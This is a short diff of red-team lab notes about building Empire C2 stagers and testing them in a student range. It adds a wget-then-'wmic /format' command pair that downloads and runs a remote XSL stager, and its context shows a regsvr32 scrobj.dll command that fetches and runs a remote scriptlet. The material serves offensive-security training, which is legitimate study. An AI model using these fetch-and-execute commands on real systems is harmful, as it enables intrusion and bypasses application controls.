@@ -8,7 +8,7 @@
 ## Overview
 This lab will focus on creating multiple payloads and then testing them in the student range. We will use various methods to gain familiarity with different techniques.
 
-### 1. Launch [[Empire C2#Create an Empire listener]]
+### Launch [[Empire C2#Create an Empire listener]] 
 
 ## [[PowerShell Stager with rundll32.exe]]
 
@@ -37,7 +37,12 @@ regsvr32 /s /n /u /i:http://10.254.252.3:8000/config.sct scrobj.dll
 
 #### *Payload:* Create WMIC Stager
 
-#### *Execution Technique:*  Executing Stager with wmic
+#### *Execution Technique:* 
+```markdown
+# Executing Stager with wmic
+wget http://10.254.252.2:8000/update.xsl -o update.xsl
+wmic os get /format:"update.xsl"
+```
 
 ---
 
